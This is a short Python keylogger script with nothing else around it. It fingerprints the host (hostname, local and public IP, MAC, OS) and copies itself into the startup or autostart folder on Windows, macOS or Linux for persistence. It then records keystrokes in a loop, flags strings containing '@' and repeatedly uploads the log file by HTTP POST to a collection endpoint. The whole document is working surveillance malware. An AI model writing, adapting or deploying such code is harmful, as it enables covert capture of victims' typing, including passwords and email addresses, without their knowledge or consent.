import os
import socket
import keyboard
import uuid
import datetime
import requests
import shutil
word_count = 0
def a():
    global word_count
    hostname = socket.gethostname()
    ip_local = socket.gethostbyname(hostname)
    ip_global = requests.get("https://api.ipify.org?format=json").json() ["ip"]
    os_name = os.name
    time = datetime.datetime.now()
    unformated_mac = uuid.getnode()
    formated_mac = "{:012x}".format(unformated_mac)
    formatted_list_mac = [formated_mac[i:i+2] for i in range(0, len(formated_mac), 2)]
    MAC = ":".join(formatted_list_mac)
    if os.name == "nt":
      startup_folder=os.path.join(os.getenv("APPDATA"),"Microsoft","Start Menu","Programs","Startup")
    elif os.name == "posix":
        if 'Darwin' in os.uname().sysname:  # MacOS
            startup_folder = os.path.expanduser('~/Library/LaunchAgents')
        else:
            startup_folder = os.path.expanduser('~/.config/autostart')
    if not os.path.exists(startup_folder):
        os.makedirs(startup_folder)
    file_path = os.path.abspath(__file__)
    shutil.copy(file_path, startup_folder)

    print("Hello, this is a message from your program!")

    while True:
            name = f"{MAC}-keylog.txt"
            name = name.replace(":", "_")
            name = name.replace("-", "_")
            with open (name,"a") as file:
                file.write(
                    f"Sent from: local {ip_local}\n  global {ip_global}\n MAC {MAC}\n OS {os_name}\n TIME {time} \n ")
                events = keyboard.record("space" or "enter" or "escape")
                ev_list = list(keyboard.get_typed_strings(events))
                ev_string = "".join(ev_list)
                file.write(ev_string)
                word_count +=1
                if "@" in ev_string:
                    file.write("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n")
                if word_count % 10 == 0:
                    file.write("-\n")
                file.flush()
                with open (name,"rb") as file1:
                    response = requests.post("http://127.0.0.1:5000/upload", files={"file": file1})
                    print(response.json())

a()